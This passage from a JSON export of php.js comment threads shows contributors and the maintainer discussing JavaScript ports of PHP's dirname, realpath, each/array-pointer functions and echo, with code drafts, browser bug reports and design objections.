'');\r\n[\/CODE]\r\nhttp:\/\/www.xorax.info\/\r\n;)"},{"date":"2008-04-28 17:28:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Xorax: Cool, thank you!"},{"date":"2008-04-29 08:55:40","author":"Philip","url":"","comment":"Question: does it work for things with ..\/ in it ?  Does the PHP version do it, for that matter?"},{"date":"2008-04-29 21:34:17","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip: Judging by the rexeg, it looks to me like dots are handled just like normal characters. So \/etc\/vsftpd\/..\/vsftpd.conf should return \/etc\/vsftpd\/..\r\nFor relative paths there's the function realpath in PHP. Maybe we should port that as well?"},{"date":"2009-03-03 18:54:07","author":"Michael","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction realpath(path) {\r\n   return path.substring(0, path.lastIndexOf('\/')) + '\/';\r\n}\r\n[\/CODE]\r\ngets for me the realpath for any file.\r\n\r\ndirname('\/myfiles\/cache\/temp\/');\r\nshould return '\/myfiles\/cache\/temp\/', so php does it.\r\nOr my I wrong?\r\n\r\nBut dirname('\/myfiles\/cache\/temp\/thefile.txt');\r\nreturn the right dirname.\r\n\r\nRegards Michael"},{"date":"2009-03-04 15:05:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael: In php, realpath is used to make an absolute path, based on a relative one:\r\n\r\ne.g.: '..\/' becomes \/tmp\/ if your pwd is \/tmp\/abc\/\r\n\r\nIf you'd want to do that in javascript, you'd have to base realpath on the location.href or something. \r\n\r\nI haven't figured out yet if that would be useful \/ desirable or not."},{"date":"2009-03-04 16:07:17","author":"Michael","url":"","comment":"@ Kevin: jepp I understand.\r\nSo here's a newer function:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction realpath(path) {\r\n    var base = '', port = '', parts = [];\r\n\r\n    \/**\r\n     * Split the given path into port and path\r\n     *\/\r\n    function urisplit(p) {\r\n        if (p.substring(0, 7).toLowerCase() === 'http:\/\/' || p.substring(0, 7).toLowerCase() === 'file:\/\/' || p.substring(0, 7).toLowerCase() === 'ftps:\/\/') {\r\n            base = p.substring(7, p.length);\r\n            port = p.substring(0, 7);\r\n        } else if (p.substring(0, 8).toLowerCase() === 'https:\/\/') {\r\n            base = p.substring(8, p.length);\r\n            port = p.substring(0, 8);\r\n        } else if (p.substring(0, 6).toLowerCase() === 'ftp:\/\/') {\r\n            base = p.substring(6, p.length);\r\n            port = p.substring(0, 6);\r\n        }\r\n    }\r\n\r\n    \/**\r\n     * Make a relative path to an absolute\r\n     * @param {String} s: source path\r\n     * @param {String} r: relative path\r\n     *\/\r\n    function abspath(s, r) {\r\n        var a = 0, add = '', arr = [], cnt = 0, num = 0, ret = '';\r\n        if (r.substring(0, 2) == '.\/') {\r\n            r = r.substring(2, r.length);\r\n        }\r\n        if (r !== '') {\r\n            arr = r.split('\/');\r\n            num = arr.length;\r\n            for (a = 0; a &lt; num; a++) {\r\n                if (arr[a] !== '') {\r\n                    if (arr[a] !== '..') {\r\n                        add += arr[a] + '\/';\r\n                    } else {\r\n                        cnt++;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        if (s !== '') {\r\n            arr = s.split('\/');\r\n            num = (arr.length - cnt);\r\n            for (a = 0; a &lt; num; a++) {\r\n                if (arr[a] !== '') {\r\n                    ret += arr[a] + '\/';\r\n                }\r\n            }\r\n            ret += add;\r\n        }\r\n        return ret;\r\n    }\r\n\r\n    \/* check for the port *\/\r\n    urisplit(path);\r\n    \/* path has no port: perhabs relative *\/\r\n    if (port == '') {\r\n        base = window.location.href;\r\n        base = base.substring(0, base.lastIndexOf('\/')) + '\/';\r\n        urisplit(base);\r\n        base = abspath(base, path);\r\n    }\r\n    else {\r\n        alert(base);\r\n        base = path.substring(0, path.lastIndexOf('\/')) + '\/';\r\n        urisplit(base);\r\n    }\r\n    path = port + base;\r\n    return path;\r\n}\r\n[\/CODE]\r\n\r\nBut this would only work if your path like something '.\/..\/path' or '.\/path\/' or '\/path' or simple 'path'"},{"date":"2009-03-05 10:44:56","author":"mk.keck","url":"","comment":"My previous function was a bit overkilled so I've made a better one:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction realpath(path) {\r\n    var p = 0, arr = [];\r\n    var r = window.location.href;\r\n    if (path.indexOf(':\/\/') !== -1) {\r\n        p = 1;\r\n    }\r\n    if (!p) {\r\n        path = r.substring(0, r.lastIndexOf('\/') + 1)\r\n             + path;\r\n    }\r\n    arr = path.split('\/');\r\n    path = [];\r\n    for (var k in arr) {\r\n        if (arr[k] == '.') {\r\n            continue;\r\n        }\r\n        if (arr[k] == '..') {\r\n            path.pop();\r\n        } else {\r\n            if (k &lt; 2 || arr[k] !== '') {\r\n                path.push(arr[k]);\r\n            }\r\n        }\r\n    }\r\n    return path.join('\/');\r\n}\r\n[\/CODE]\r\n\r\nHow it works:\r\n[CODE=&quot;Javascript&quot;]\r\nurl = 'this\/is\/..\/a\/.\/test\/.\/\/\/is';\r\nurl = realpath(url);\r\nalert(url);\r\n[\/CODE]\r\nwill alert something like:\r\n'http:\/\/yourhost.tld\/yourpath\/this\/a\/test\/is'\r\n\r\nI hope this would be good reason for simulate php's realpath function in javascript ;)"},{"date":"2009-03-06 16:04:03","author":"mk.keck","url":"","comment":"Hi again,\r\n\r\nsorry: in last post there are some mistakes.\r\nIf your path leaves outside the window.location.href the path may be wrong.\r\nI've never a seen a system, where you can leave the doc-root ;)\r\n\r\nNow here's the final function and I hope it would be nice, that realpath is proted php.js ;)\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/**\r\n * Expands all symbolic links and resolves references\r\n * to '\/.\/', '\/..\/' and extra '\/' characters in the\r\n * input 'path' and return the canonicalized absolute\r\n * pathname\r\n * @param {String} path: the relative pathname\r\n * Note:\r\n *     The returned path is an url like e.g.\r\n *     'http:\/\/yourhost.tld\/path\/'\r\n *\/\r\nfunction realpath(path) {\r\n    var p = 0, arr = [];\r\n    \/* Save the root, if not given *\/\r\n    var r = window.location.href;\r\n    \/* Avoid input failures *\/\r\n    path = (path + '').replace('\\\\', '\/');\r\n    \/* Check if there's a port in path (like 'http:\/\/') *\/\r\n    if (path.indexOf(':\/\/') !== -1) {\r\n        p = 1;\r\n    }\r\n    \/* Ok, there's not a port in path, so let's take the root *\/\r\n    if (!p) {\r\n        path = r.substring(0, r.lastIndexOf('\/') + 1) + path;\r\n    }\r\n    \/* Explode the given path into it's parts *\/\r\n    arr = path.split('\/');\r\n    \/* The path is an array now *\/\r\n    path = [];\r\n    \/* Foreach part make a check *\/\r\n    for (var k in arr) {\r\n        \/* This is'nt really interesting *\/\r\n        if (arr[k] == '.') {\r\n            continue;\r\n        }\r\n        \/* This reduces the realpath *\/\r\n        if (arr[k] == '..') {\r\n            \/* But only if there more than 3 parts in the path-array.\r\n             * The first three parts are for the uri *\/\r\n            if (path.length &gt; 3) {\r\n                path.pop();\r\n            }\r\n        }\r\n        \/* This adds parts to the realpath *\/\r\n        else {\r\n            \/* But only if the part is not empty or the uri\r\n             * (the first three parts ar needed) was not\r\n             * saved *\/\r\n            if ((path.length &lt; 2) || (arr[k] !== '')) {\r\n                path.push(arr[k]);\r\n            }\r\n        }\r\n    }\r\n    \/* Returns the absloute path as a string *\/\r\n    return path.join('\/');\r\n}\r\n\r\n\r\n\/**\r\n * EXAMPLES\r\n * perhabs your window.location.href returns something like this:\r\n * 'http:\/\/www.myserver.com\/js\/rp\/my.html'\r\n *\/\r\n\r\n\/\/ Example 1\r\n    path = 'this\/is\/..\/a\/test\/.\/\/is';\r\n    path = realpath(path);\r\n    \/\/ result: 'http:\/\/www.myserver.com\/js\/rp\/this\/a\/test\/is'\r\n\r\n\/\/ Example 2\r\n    path = '..\/this\/is\/..\/a\/test\/.\/\/is';\r\n    path = realpath(path);\r\n    \/\/ result: 'http:\/\/www.myserver.com\/js\/this\/a\/test\/is'\r\n\r\n\/\/ Example 3\r\n    path = '..\/..\/..\/this\/is\/..\/a\/test\/.\/\/is';\r\n    path = realpath(path);\r\n    \/\/ result: 'http:\/\/www.myserver.com\/this\/a\/test\/is'\r\n    \/\/ note:   you can't leave your server ;)\r\n[\/CODE]"},{"date":"2009-05-11 21:39:11","author":"Michael White","url":"http:\/\/getsprink.com","comment":"Hey,\n\nI was working with the __DIR__() and __FILE__() stuff again today and I ran across a bug in this function.\n\nIf you pass something like 'filename.js' to this function in IE7 it will return 'filename.js' instead of '.'\n\nTo work around the behavior of IE I modified the function to the following:\n\n[CDOE]\nfunction dirname(path){\n\tvar dir = path.replace(\/\\\\\/g,'\/').replace(\/\\\/[^\\\/]*\\\/?$\/,'');\n\treturn (dir && !dir == path) ? dir : '.';\n}\n[\/CODE]\n\nThe only change is to store the result of the regex in a variable and then check to see if the result is empty or if the result is equivalent to the original input.\n\nThe result of the regex should only be equal to the original input if using IE7 (6\/8????) AND that original input was just the file name and contained no slashes or directory components."},{"date":"2010-02-15 23:35:02","author":"starmonkey","url":"","comment":"Using this function:\n\n[code]\ndirname(\"\/index.htm\")\n[\/code]\n\nGives me \n\n\"\"\n\nUsing PHP (4):\n\n[code]\necho \"<br\/>dirname test:\".dirname(\"\/index.htm\");\n[\/code]\n\nGives me \"dirname test:\/\""},{"date":"2012-04-23 14:50:14","author":"???? ????","url":"http:\/\/an3m1.com\/","comment":"Write more, that\u2019s all I have to say. Literally, it seems as though you relied on the video to make your point. You clearly know what you\u2019re talking about, why waste your intelligence on just posting videos to your blog when you could be giving us something enlightening to read \n"}],"each":[{"date":"2008-12-20 17:59:02","author":"Brett Zamir","url":"","comment":"While the above functioning works fine from what I can tell (besides not offering to return a regular array in circumstances as is useful with destructuring assignment in JavaScript 1.7), in order to maintain pointer state in a way which would work across all such functions (and also make the array key a little more &quot;namespaced&quot;), I rewrote each() as well as added all of the following functions. I hadn't thought about using a property on the array to preserve the pointer position until now, so I was mistaken in thinking it not possible to do this in JavaScript.\r\n\r\n...Examples are adapted from the PHP manual...Note that the pointer property is not reset by other JavaScript actions as it might be in PHP (e.g., assigning an array to another variable).\r\n\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]$foo = {&quot;Robert&quot; : &quot;Bob&quot;, &quot;Seppo&quot; : &quot;Sepi&quot;};\r\n$bar = each($foo);\r\nvar_dump($bar)\r\n\r\n$fruit = {'a' : 'apple', 'b' : 'banana', 'c' : 'cranberry'};\r\n\r\nreset($fruit);\r\nwhile ([$key, $val] = each($fruit)) {\r\n    alert( $key +&quot;:&quot;+ $val+&quot;\\n&quot;);\r\n}\r\n\r\n\r\n$transport = new Array('foot', 'bike', 'car', 'plane');\r\n\/\/ $transport = {a:2, b:3}; \/\/ Tried also with this\r\n$mode = current($transport); \/\/ $mode = 'foot';\r\n$mode = next($transport);    \/\/ $mode = 'bike';\r\n$mode = current($transport); \/\/ $mode = 'bike';\r\n$mode = prev($transport);    \/\/ $mode = 'foot';\r\n$mode = end($transport);     \/\/ $mode = 'plane';\r\n$mode = current($transport); \/\/ $mode = 'plane';\r\n\r\n$arr = [];\r\nvar_dump(current($arr)); \/\/ bool(false)\r\n\r\n$arr = new Array([]);\r\nvar_dump(current($arr)); \/\/ array(0) { }\r\n \r\n\r\nfunction pos (arr) { \/\/ Alias of current\r\n\treturn current(arr);\r\n}\r\nfunction current (arr) {\r\n\tif (!arr._phpjs_pos) {\r\n\t\tarr._phpjs_pos = 0;\r\n\t}\r\n\tif (arr instanceof Array) {\r\n\t\treturn arr[arr._phpjs_pos] || false;\r\n\t}\r\n\tvar ct = 0;\r\n\tfor (var k in arr) {\r\n\t\tif (k !== '_phpjs_pos') {\r\n\t\t\tif (ct === arr._phpjs_pos) {\r\n\t\t\t\treturn arr[k];\r\n\t\t\t}\r\n\t\t\tct++;\r\n\t\t}\r\n\t}\r\n\treturn false; \/\/ Empty\r\n}\r\nfunction next (arr) {\r\n\tif (!arr._phpjs_pos) {\r\n        arr._phpjs_pos = 0;\r\n    }\r\n\tif (!(arr instanceof Array)) {\r\n\t\tvar ct = 0;\r\n\t\tfor (var k in arr) {\r\n\t\t\tif (k !== '_phpjs_pos') {\r\n\t\t\t\tif (ct === arr._phpjs_pos+1) {\r\n\t\t\t\t\tarr._phpjs_pos += 1;\r\n\t\t\t\t\treturn arr[k];\r\n\t\t\t\t}\r\n\t\t\t\tct++;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn false; \/\/ End\r\n\t}\r\n    if (arr.length === 0 || arr._phpjs_pos === (arr.length-1)) {\r\n        return false;\r\n    }\r\n    arr._phpjs_pos += 1;\r\n    return arr[arr._phpjs_pos];\r\n}\r\nfunction prev (arr) {\r\n\tif (arr._phpjs_pos === 0 || arr._phpjs_pos === undefined) {\r\n\t\treturn false;\r\n\t}\r\n\tif (!(arr instanceof Array)) {\r\n\t\tvar ct = 0;\r\n\t\tfor (var k in arr) {\r\n\t\t\tif (k !== '_phpjs_pos') {\r\n\t\t\t\tif (ct === arr._phpjs_pos-1) {\r\n\t\t\t\t\tarr._phpjs_pos -= 1;\r\n\t\t\t\t\treturn arr[k];\r\n\t\t\t\t}\r\n\t\t\t\tct++;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\/\/ Shouldn't reach here\r\n\t}\r\n\tif (arr.length === 0) {\r\n        return false;\r\n    }\r\n    arr._phpjs_pos -= 1;\r\n    return arr[arr._phpjs_pos];\r\n}\r\nfunction reset (arr) {\r\n\tif (!(arr instanceof Array)) {\r\n\t\tfor (var k in arr) {\r\n\t\t\tif (k !== '_phpjs_pos') {\r\n\t\t\t\tarr._phpjs_pos = 0;\r\n\t\t\t\treturn arr[k];\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn false; \/\/ Empty\r\n\t}\r\n\tif (arr.length === 0) {\r\n\t\treturn false;\r\n\t}\r\n\tarr._phpjs_pos = 0;\r\n    return arr[arr._phpjs_pos];\r\n}\r\nfunction end (arr) {\r\n\tif (!(arr instanceof Array)) {\r\n\t\tvar ct = 0;\r\n\t\tfor (var k in arr) {\r\n\t\t\tif (k !== '_phpjs_pos') {\r\n\t\t\t\tct++;\r\n\t\t\t\tvar val = arr[k];\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (ct === 0) {\r\n\t\t\treturn false; \/\/ Empty\r\n\t\t}\r\n\t\tarr._phpjs_pos = ct - 1;\r\n\t\treturn val;\r\n\t}\r\n\tif (arr.length === 0) {\r\n\t\treturn false;\r\n\t}\r\n\tarr._phpjs_pos = arr.length - 1;\r\n    return arr[arr._phpjs_pos];\r\n}\r\nfunction key (arr) {\r\n        if (!arr._phpjs_pos) {\r\n\t\tarr._phpjs_pos = 0;\r\n\t}\r\n\tif (!(arr instanceof Array)) {\r\n\t\tvar ct = 0;\r\n\t\tfor (var k in arr) {\r\n\t\t\tif (k !== '_phpjs_pos') {\r\n\t\t\t\tif (ct === arr._phpjs_pos) {\r\n\t\t\t\t\treturn k;\r\n\t\t\t\t}\r\n\t\t\t\tct++;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn false; \/\/ Empty\r\n\t}\r\n\tif (arr.length === 0) { \/\/ Todo: verify this is result (and return false just above)\r\n\t\treturn false;\r\n\t}\r\n\treturn arr._phpjs_pos !== undefined ? arr._phpjs_pos : 0;\r\n}\r\nfunction each (arr) {\r\n\t\/\/ Will return a 4-item object unless a class property 'returnArrayOnly' is set to true on this function if want to only receive a two-item numerically-indexed array (for the sake of array destructuring in JavaScript 1.7+ (similar to list() in PHP, but as PHP does it automatically in that context and JavaScript cannot, we needed something to allow that option)\r\n\t\/\/ \tSee https:\/\/developer.mozilla.org\/en\/New_in_JavaScript_1.7#Destructuring_assignment\r\n\tif (!arr._phpjs_pos) {\r\n\t\tarr._phpjs_pos = 0;\r\n\t}\r\n\tif (!(arr instanceof Array)) {\r\n\t\tvar ct = 0;\r\n\t\tfor (var k in arr) {\r\n\t\t\tif (k !== '_phpjs_pos') {\r\n\t\t\t\tif (ct === arr._phpjs_pos) {\r\n\t\t\t\t\tarr._phpjs_pos += 1;\r\n\t\t\t\t\tif (each.returnArrayOnly) {\r\n\t\t\t\t\t\treturn [k, arr[k]];\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse {\r\n\t\t\t\t\t\treturn {1:arr[k], value:arr[k], 0:k, key:k};\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tct++;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn false; \/\/ Empty\r\n\t}\r\n\tif (arr.length === 0 || arr._phpjs_pos === arr.length) {\r\n\t\treturn false;\r\n\t}\r\n\tpos = arr._phpjs_pos;\r\n\tarr._phpjs_pos += 1;\r\n\tif (each.returnArrayOnly) {\r\n\t\treturn [pos, arr[pos]];\t\r\n\t}\r\n\telse {\r\n\t\treturn {1:arr[pos], value:arr[pos], 0:pos, key:pos};\r\n\t}\r\n}\r\n[\/CODE]"},{"date":"2008-12-30 12:05:49","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: That's some hard labour there Brett. And it makes me smile that with these functions you could actually do this:\r\n[CODE=&quot;Javascript&quot;]\r\nreset($fruit);\r\nwhile ([$key, $val] = each($fruit)) {\r\n    echo ($key +&quot;:&quot;+ $val+&quot;\\n&quot;);\r\n}\r\n[\/CODE]\r\nIn JavaScript :) So kuddo's to you man.\r\n\r\nBut (sorry, there always is a but) before adding, I do not feel comfortable storing the pointer inside the userobject. This may introduce the infamous Heisenbug. \r\n\r\nImagine you have an important object that stores user information. You work on it using reset &amp; each (you do not expect these to alter your data in any way), serialize it, and finally send it to the server.\r\nNow the serialized information will contain a strange element: '_phpjs_pos' that may lead to all kind of unexpected results. It may cause unaware developers some hard time debugging, and may (in some rare cases but still) even lead to server side data corruption. In short, this is not something I can willingly introduce to the project.\r\n\r\nI'd rather it be stored in the window.php_js global variable, as we already have such a mechanism for include_once. So we're not introducing additional dirt.\r\n\r\nI imagine something like:\r\n[CODE=&quot;Javascript&quot;]\r\nwindow.php_js.pointers[pointerId] = key;\r\n[\/CODE]\r\n\r\nOne challenge of that approach is that we'd have to figure out a way to add the scope to the so-called pointerId. But if we cannot overcome that I have some strong issues with adding these current implementations. \r\n\r\nCan you guys share this opinion?"},{"date":"2008-12-30 18:19:10","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Yeah, that's a good point about serialization.\r\n\r\nSince we can't get unique memory addresses directly in JavaScript (thank heavens!) (and toSource() as an id would not distinguish between arrays with the same values), I think what we might try is to store their references directly (for the sake of later comparison) like this along with the key:\r\n\r\n[CODE=&quot;Javascript&quot;]var pointers = window.php_js.pointers;\r\nif (pointers.indexOf(arr) === -1) {\r\n    pointers.push(arr, incrementVal);\r\n}\r\nelse {\r\n    pointers[pointers.indexOf(arr)+1] += incrementVal; \/\/ Or do whatever needed to be done\r\n}\r\n[\/CODE]\r\n\r\nI'll try to look into that later (unless you're so inspired), as well as get back to you on the constants function... All the best..."},{"date":"2008-12-31 13:19:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: You're onto something there! I'm sure we'll work it out next year ;) Guys, best wishes and have a good one tonight. Have a drink from me will you?\r\n\r\nAnd let 2009 be a happy &amp; successful year for you &amp; your projects :) Regards!"},{"date":"2009-01-01 03:28:57","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi Kevin,\r\n\r\nI think I got it working now...\r\n\r\nThanks for the offer... Although I don't drink (I'm a Baha'i), if I did drink, I'd be glad to have one with you... You seem like a most gracious person... Have a happy new year... And Onno too--thanks for keeping me on my toes, you guys... :)\r\n\r\n[CODE=&quot;Javascript&quot;]function pos (arr) { \/\/ Alias of current\r\n  return current(arr);\r\n}\r\nfunction current (arr) {\r\n  if (!window.php_js) window.php_js = {pointers:[]};\r\n  var pointers = window.php_js.pointers;\r\n  if (pointers.indexOf(arr) === -1) {\r\n    pointers.push(arr, 0);\r\n  }\r\n  var arrpos = pointers.indexOf(arr);\r\n  var cursor = pointers[arrpos+1];\r\n  if (arr instanceof Array) {\r\n    return arr[cursor] || false;\r\n  }\r\n  var ct = 0;\r\n  for (var k in arr) {\r\n    if (ct === cursor) {\r\n      return arr[k];\r\n    }\r\n    ct++;\r\n  }\r\n  return false; \/\/ Empty\r\n}\r\nfunction next (arr) {\r\n  if (!window.php_js) window.php_js = {pointers:[]};\r\n  var pointers = window.php_js.pointers;\r\n  if (pointers.indexOf(arr) === -1) {\r\n    pointers.push(arr, 0);\r\n  }\r\n  var arrpos = pointers.indexOf(arr);\r\n  var cursor = pointers[arrpos+1];\r\n  if (!(arr instanceof Array)) {\r\n    var ct = 0;\r\n    for (var k in arr) {\r\n      if (ct === cursor+1) {\r\n        pointers[arrpos+1] += 1;\r\n        return arr[k];\r\n      }\r\n      ct++;\r\n    }\r\n    return false; \/\/ End\r\n  }\r\n  if (arr.length === 0 || cursor === (arr.length-1)) {\r\n      return false;\r\n  }\r\n  pointers[arrpos+1] += 1;\r\n  return arr[pointers[arrpos+1]];\r\n}\r\nfunction prev (arr) {\r\n  if (!window.php_js) window.php_js = {pointers:[]};\r\n  var pointers = window.php_js.pointers;\r\n  var arrpos = pointers.indexOf(arr);\r\n  var cursor = pointers[arrpos+1];\r\n  if (pointers.indexOf(arr) === -1 || cursor === 0) {\r\n    return false;\r\n  }\r\n  if (!(arr instanceof Array)) {\r\n    var ct = 0;\r\n    for (var k in arr) {\r\n      if (ct === cursor-1) {\r\n        pointers[arrpos+1] -= 1;\r\n        return arr[k];\r\n      }\r\n      ct++;\r\n    }\r\n    \/\/ Shouldn't reach here\r\n  }\r\n  if (arr.length === 0) {\r\n    return false;\r\n  }\r\n  pointers[arrpos+1] -= 1;\r\n  return arr[pointers[arrpos+1]];\r\n}\r\nfunction reset (arr) {\r\n  if (!window.php_js) window.php_js = {pointers:[]};\r\n  var pointers = window.php_js.pointers;\r\n  if (pointers.indexOf(arr) === -1) {\r\n    pointers.push(arr, 0);\r\n  }\r\n  var arrpos = pointers.indexOf(arr);\r\n  if (!(arr instanceof Array)) {\r\n    for (var k in arr) {\r\n      if (pointers.indexOf(arr) === -1) {\r\n       pointers.push(arr, 0);\r\n      }\r\n      else {\r\n        pointers[arrpos+1] = 0;\r\n      }\r\n      return arr[k];\r\n    }\r\n    return false; \/\/ Empty\r\n  }\r\n  if (arr.length === 0) {\r\n    return false;\r\n  }\r\n  pointers[arrpos+1] = 0;\r\n  return arr[pointers[arrpos+1]];\r\n}\r\nfunction end (arr) {\r\n  if (!window.php_js) window.php_js = {pointers:[]};\r\n  var pointers = window.php_js.pointers;\r\n  if (pointers.indexOf(arr) === -1) {\r\n    pointers.push(arr, 0);\r\n  }\r\n  var arrpos = pointers.indexOf(arr);\r\n  if (!(arr instanceof Array)) {\r\n    var ct = 0;\r\n    for (var k in arr) {\r\n      ct++;\r\n      var val = arr[k];\r\n    }\r\n    if (ct === 0) {\r\n      return false; \/\/ Empty\r\n    }\r\n    pointers[arrpos+1] = ct - 1;\r\n    return val;\r\n  }\r\n  if (arr.length === 0) {\r\n    return false;\r\n  }\r\n  pointers[arrpos+1] = arr.length - 1;\r\n  return arr[pointers[arrpos+1]];\r\n}\r\nfunction key (arr) {\r\n  if (!window.php_js) window.php_js = {pointers:[]};\r\n  var pointers = window.php_js.pointers;\r\n  if (pointers.indexOf(arr) === -1) {\r\n    pointers.push(arr, 0);\r\n  }\r\n  var cursor = pointers[pointers.indexOf(arr)+1];\r\n  if (!(arr instanceof Array)) {\r\n    var ct = 0;\r\n    for (var k in arr) {\r\n      if (ct === cursor) {\r\n        return k;\r\n      }\r\n      ct++;\r\n    }\r\n    return false; \/\/ Empty\r\n  }\r\n  if (arr.length === 0) {\r\n    return false;\r\n  }\r\n  return cursor;\r\n}\r\nfunction each (arr) {\r\n  \/\/ Will return a 4-item object unless a class property 'returnArrayOnly' is set to true on this function if want to only receive a two-item numerically-indexed array (for the sake of array destructuring in JavaScript 1.7+ (similar to list() in PHP, but as PHP does it automatically in that context and JavaScript cannot, we needed something to allow that option)\r\n  \/\/   See https:\/\/developer.mozilla.org\/en\/New_in_JavaScript_1.7#Destructuring_assignment\r\n  if (!window.php_js) window.php_js = {pointers:[]};\r\n  var pointers = window.php_js.pointers;\r\n  if (pointers.indexOf(arr) === -1) {\r\n    pointers.push(arr, 0);\r\n  }\r\n  var arrpos = pointers.indexOf(arr);\r\n  var cursor = pointers[arrpos+1];\r\n  if (!(arr instanceof Array)) {\r\n    var ct = 0;\r\n    for (var k in arr) {\r\n      if (ct === cursor) {\r\n        pointers[arrpos+1] += 1;\r\n        if (each.returnArrayOnly) {\r\n          return [k, arr[k]];  \r\n        }\r\n        else {\r\n          return {1:arr[k], value:arr[k], 0:k, key:k};\r\n        }\r\n      }\r\n      ct++;\r\n    }\r\n    return false; \/\/ Empty\r\n  }\r\n  if (arr.length === 0 || cursor === arr.length) {\r\n    return false;\r\n  }\r\n  pos = cursor;\r\n  pointers[arrpos+1] += 1;\r\n  if (each.returnArrayOnly) {\r\n    return [pos, arr[pos]];  \r\n  }\r\n  else {\r\n    return {1:arr[pos], value:arr[pos], 0:pos, key:pos};\r\n  }\r\n}\r\n[\/CODE]"},{"date":"2009-01-01 03:50:27","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"By the way, I noticed now that there is a built-in way in JavaScript 1.7 to do the each() iteration: using Iterator() (and otherwise progress through arrays\/objects).  See https:\/\/developer.mozilla.org\/en\/New_in_JavaScript_1.7#Looping_across_objects and https:\/\/developer.mozilla.org\/en\/Core_JavaScript_1.5_Guide\/Iterators_and_Generators#Iterators\r\n\r\nStill, it shouldn't hurt to have them with the PHP equivalents (I think the PHP way is easier)...\r\n\r\nBrett"},{"date":"2009-01-06 14:01:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Nice dude :)"}],"echo":[{"date":"2008-04-15 08:34:09","author":"Philip Peterson","url":"","comment":"I think this function is breaking php.js tester x.x"},{"date":"2008-04-15 09:03:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Probably because it's executing a document.write from outside the real document, don't you think?"},{"date":"2008-04-16 18:17:48","author":"echo is bad","url":"","comment":"Using innerHTML on the BODY is very dangerous because you will break all references to HTMLElements that were done before !\r\n\r\nI strongly recommend you to use document.createDocumentFragment."},{"date":"2008-04-17 12:45:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ echo is bad: I've never used that function, could you tell me:\r\n- this is what the code Should look like?\r\n- your name to include in the comment"},{"date":"2008-10-14 22:43:47","author":"Philip Peterson","url":"","comment":"From Ronsguide.com:\r\n\r\nvar docFragment = document.createDocumentFragment(); \r\nvar txt = document.createTextNode(&quot;my text node&quot;); \r\ndocFragment.appendChild(txt);\r\n\r\nI guess probably something like that? (note that I am not &quot;echo is bad&quot;.)\r\n\r\nPerhaps there should be an alias print() which would take one argument?  It may also be useful to handle \\b things (I think php does this, but I'm not sure), which could be accomplished by inserting some text that appears nowhere else in the document (like [COD_92993] or something) and then modify the .innerHTML of the body by removing that [COD_92993] plus as many characters as there are \\b's."},{"date":"2008-10-18 03:07:05","author":"Philip Peterson","url":"","comment":"Also, this is a very pressing issue.  In Firefox, at the line\r\n\r\n[CODE]\r\ndocument.appendChild(elmt);\r\n[\/CODE]\r\n\r\nthe script breaks, because it should be (for Firefox at least)\r\n\r\n[CODE]\r\nbody.appendChild(elmt);\r\n[\/CODE]"},{"date":"2008-10-18 03:15:22","author":"Philip Peterson","url":"","comment":"Aggh, sorry to clog up the comments, but there's also another problem: using createTextNode and then appending it like that converts all the special characters (e.g. tags) to HTML entities, thus reducing the usability of HTML formatting in echo()."},{"date":"2008-10-20 18:24:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip Peterson: I've fixed the first issue, we still have to work on the second one."},{"date":"2008-10-29 03:18:11","author":"waldo malqui silva","url":"","comment":"HI, Kevin I'm back from long tiime, I wanna know if is possible 2 things:\r\n\r\n1.- Change mi nick (_argos) by my real name (Waldo Malqui Silva) :p\r\n2.- If you have a TODO list of functions to port.\r\n\r\n\r\nI'm happy to back and see more functions that in my last visit. I promise practice more my english :p\r\n\r\nPD: I'm working in a customizable download for the project like mootools 1.11 (packages\u00c2\u00bf?) based on the PHP functions group :p"},{"date":"2008-11-03 11:08:12","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Waldo Malqui Silva: Hi there! Good to have you back Waldo! I've changed all the _argos credits to Waldo Malqui Silva.\r\n\r\nWe track the 'unported' functions in SVN, which can also be viewed here:\r\nhttp:\/\/trac.plutonia.nl\/projects\/phpjs\/browser\/trunk\/_unported\r\n\r\nEverytime we create a new function it's moved from .\/_unported to .\/functions\r\n\r\nI'll be looking forward to seeing some of your excellent work again.  And your english i fine btw ;) ciao!"},{"date":"2008-11-13 16:16:35","author":"Nate","url":"","comment":"There are a few problems with this function.\r\n\r\n1. There is a misspelling.  The code\r\n[CODE=&quot;Javascript&quot;]\r\n            var txt = document.createTextNode(aarg);\r\n[\/CODE]\r\nShould read\r\n[CODE=&quot;Javascript&quot;]\r\n            var txt = document.createTextNode(arg);\r\n[\/CODE]\r\n\r\n2. After\r\n[CODE=&quot;Javascript&quot;]\r\n            docFragment.appendChild(txt); \r\n[\/CODE]\r\nyou need the line\r\n[CODE=&quot;Javascript&quot;]\r\n            document.body.appendChild(docFragment);\r\n[\/CODE]\r\n\r\nI tested it with Firefox, IE, Opera, and Chrome (via wine), and they all worked (on Linux).\r\n\r\n3. Like Philip Peterson pointed out, 